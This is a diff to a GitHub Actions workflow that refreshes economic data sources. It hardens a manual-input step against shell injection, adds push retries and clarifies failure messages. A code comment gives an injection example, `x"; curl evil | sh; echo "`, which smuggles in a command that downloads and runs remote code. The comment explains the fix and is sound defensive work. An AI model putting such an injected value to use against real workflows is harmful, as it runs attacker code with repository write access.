@@ -8,7 +8,7 @@ on:
   workflow_dispatch:
     inputs:
       only:
-        description: 'Run a single source (fred, rbi_forward_book, rbi_wss, rbihub, nsdl_fpi, india_misc)'
+        description: 'Run a single source (market, rbi_forward_book, rbi_wss, rbihub, nsdl_fpi, india_misc)'
         required: false
         default: ''
 
@@ -43,9 +43,14 @@ jobs:
         # Capping the step means a slow fetch is killed but the commit still runs.
         timeout-minutes: 30
         continue-on-error: true          # commit partial results even on failure
+        env:
+          # Passed via env, never interpolated into the shell: an input like
+          # `x"; curl evil | sh; echo "` would otherwise execute with a
+          # contents:write token.
+          ONLY: ${{ github.event.inputs.only }}
         run: |
-          if [ -n "${{ github.event.inputs.only }}" ]; then
-            python run.py --only "${{ github.event.inputs.only }}"
+          if [ -n "$ONLY" ]; then
+            python run.py --only "$ONLY"
           else
             python run.py
           fi
@@ -60,12 +65,26 @@ jobs:
             echo "no changes"
           else
             git commit -m "refresh $(date -u +%Y-%m-%dT%H:%MZ)"
-            git push
+            # Retry with a rebase: a human push landing between checkout and here
+            # would otherwise fail the step under `bash -e` and redden the run.
+            for i in 1 2 3; do
+              git push && break
+              echo "push rejected, rebasing (attempt $i)"
+              git pull --rebase --autostash origin main || true
+              sleep 5
+            done
           fi
 
-      - name: Surface data-quality failures
+      - name: Surface failures
         if: always() && steps.fetch.outcome != 'success'
         run: |
-          echo "::error::Fetch reported data-quality errors. See MANIFEST.md."
-          sed -n '1,60p' MANIFEST.md || true
+          # A wall-clock kill and a data-quality error look identical in the
+          # Actions UI unless we distinguish them here.
+          if [ -f MANIFEST.md ]; then
+            echo "::error::Fetch step did not succeed - see the manifest below."
+            sed -n '1,60p' MANIFEST.md
+          else
+            echo "::error::Fetch step produced no manifest at all - it was almost"
+            echo "certainly killed by the 30-minute step timeout."
+          fi
           exit 1
